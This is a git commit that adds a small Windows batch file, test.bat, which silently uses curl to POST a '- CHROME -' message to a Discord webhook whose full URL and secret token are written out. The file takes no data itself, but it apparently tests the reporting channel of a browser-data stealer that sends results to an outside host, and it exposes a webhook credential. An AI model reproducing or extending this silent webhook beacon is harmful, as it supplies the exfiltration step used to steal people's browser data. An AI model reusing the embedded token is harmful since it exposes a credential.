c48e768e14d5616d411c99ab976f0936c54e31ad
cybercookie123 <70143523+cybercookie123@users.noreply.github.com>
2023-08-15 00:40:49 +0200

    Add files via upload

---
+++ test.bat
@@ -0,0 +1,3 @@
+@echo off 
+
+curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  https://discord.com/api/webhooks/1136998740037738640/lmhV2uypII_zCLi0ofnyLRH5mtlrz4Z31FjeZ-VBU357QeJoEzgz5o6xNuVhoVF63SEX
